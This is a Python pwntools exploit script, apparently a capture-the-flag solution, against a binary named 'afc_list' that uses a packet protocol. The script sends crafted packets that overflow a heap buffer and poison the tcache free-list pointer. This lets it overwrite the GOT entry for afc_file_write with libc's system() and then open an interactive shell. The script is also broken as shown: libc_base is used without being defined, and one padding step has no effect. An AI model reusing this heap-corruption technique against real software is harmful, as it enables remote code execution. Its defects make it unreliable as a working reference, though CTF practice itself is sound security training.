#!/usr/bin/env python3

from pwn import *

elf = ELF("afc_list")
libc = ELF("./libc.so.6")

context.binary = elf
context.terminal = "kitty @ launch --location=vsplit --cwd=current".split()

def conn():
    if args.REMOTE:
        p = remote("addr", 1337)
    else:
        if args.GDB:
            p = gdb.debug([elf.path], aslr=True, api=False, gdbscript="""
                          """)
        else:
            p = process([elf.path])

    return p

AFC_MAGIC = b"CFA6LPAA"
AFC_OP_DATA = 2
SYSTEM_OFFSET = 0x52290
AFC_FILE_WRITE_GOT = 0x4040a0

def pkt(entire_len, this_len, packet_num, payload):
    packet = AFC_MAGIC
    packet += p64(40 + entire_len)
    packet += p64(40 + this_len)
    packet += p64(packet_num)
    packet += p64(AFC_OP_DATA)
    packet += payload

    return packet

def parse_recv(p):
    buffer = b""
    while AFC_MAGIC not in buffer:
        chunk = p.recv(1)
        if not chunk:
            log.error("conexao fechada")
            exit(1)
        buffer += chunk

    b, r = buffer.split(AFC_MAGIC, 1)
    header = AFC_MAGIC + r + p.recv(40 - len(AFC_MAGIC) - len(r))

    magic = u64(header[0:8])
    entire_len = u64(header[8:16])
    this_len = u64(header[16:24])
    packet_num = u64(header[24:32])
    op = u64(header[32:40])

    body = p.recv(this_len - 40) if this_len > 40 else b""

    return b, packet_num, op, body


def send(p, line, payload, entire_len, this_len):
    p.sendline(line)
    b, packet_num, op, body = parse_recv(p)
    p.send(pkt(entire_len, this_len, packet_num, payload))


def main():
    p = conn()

    # pwn it
    system_addr = libc_base + SYSTEM_OFFSET

    # tcache:
    #   0x20 bin: chunk 2 [list] -> chunk 3 [strdup("A")]
    #   0x30 bin: chunk 1 [strdup("BBB...")]
    #   0x110 bin: chunk 0 [data]
    p1 = b"A\x00" 
    p1 += b"B"*31 + b"\x00"
    p1.ljust(0x100, b"C")

    log.info(f"initial payload = {p1}")    
    send(p,
         b"ls /",
         p1,
         len(p1),
         len(p1)
         )

    # if does malloc(entire_len=0x100) which will return the 0x110 chunk on
    # tcache, and then afc_receive_data reads this_len=0x110 into it, leading
    # to an overflow into the 0x20 freed chunk and overwriting its fd ptr
    p2 = b"D"*0x110 + p64(AFC_FILE_WRITE_GOT)

    send(p,
         b"mkdir /x",
         p2,
         0x100,
         len(p2)
         )

    p3 = b"/readflag sekai ppp # " + b"E"*32 + b"\x00"
    p3 += b"X"*8 + p64(system_addr)  + b"\x00"

    send(p,
         b"ls /",
         p3,
         len(p3),
         len(p3)
         )


    p.interactive()

if __name__ == '__main__':
    main()

